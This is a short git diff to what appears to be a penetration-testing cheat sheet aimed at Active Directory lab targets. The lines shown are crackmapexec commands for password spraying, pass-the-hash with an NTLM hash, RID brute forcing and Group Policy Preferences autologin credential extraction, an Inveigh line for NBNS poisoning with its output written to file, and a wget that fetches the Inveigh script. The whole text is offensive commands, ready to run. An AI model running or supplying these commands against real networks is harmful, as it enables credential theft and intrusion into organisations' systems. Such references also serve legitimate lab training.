@@ -455,6 +455,9 @@ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continu
 crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
 crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
+
+# GPP
+crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
 ```
 ### PsMapexec
 ```powershell
@@ -538,7 +541,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
 ## Inveigh
 ```bash
 wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
-Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y 
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y 
 ```
 ## PsExec
 ```powershell
